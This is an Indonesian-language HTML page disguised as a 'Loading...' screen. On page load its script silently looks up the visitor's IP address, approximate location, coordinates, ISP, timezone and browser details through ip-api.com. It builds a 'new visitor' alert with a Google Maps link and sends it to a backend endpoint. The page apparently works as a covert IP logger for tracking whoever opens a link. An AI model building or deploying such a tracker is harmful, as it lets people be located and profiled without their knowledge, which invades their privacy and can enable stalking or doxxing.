<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
</head>
<body>
  <h3>Sedang memuat...</h3>

  <script>
    async function sendVisitorData() {
      try {
        // Ambil IP & lokasi dari ip-api
        const res = await fetch("https://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,zip");
        const data = await res.json();

        if (data.status !== "success") {
          throw new Error(data.message || "Gagal ambil data IP");
        }

        const ua = navigator.userAgent;

        const text = `
ğŸ“¡ *Pengunjung Baru!*
ğŸŒ IP: ${data.query}
ğŸŒ Negara: ${data.country}
ğŸ™ Kota: ${data.city}, ${data.regionName} ${data.zip}
ğŸ›° ISP: ${data.isp}
ğŸ¢ Org: ${data.org}
âš¡ ASN: ${data.as}
âŒš Zona Waktu: ${data.timezone}
ğŸ“Œ Koordinat: ${data.lat}, ${data.lon}
ğŸ”— https://www.google.com/maps?q=${data.lat},${data.lon}

ğŸ“± Device: ${ua}
        `;

        // Kirim ke API backend
        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text })
        });

      } catch (err) {
        console.error("Error:", err);
      }
    }

    sendVisitorData();
  </script>
</body>
</html>
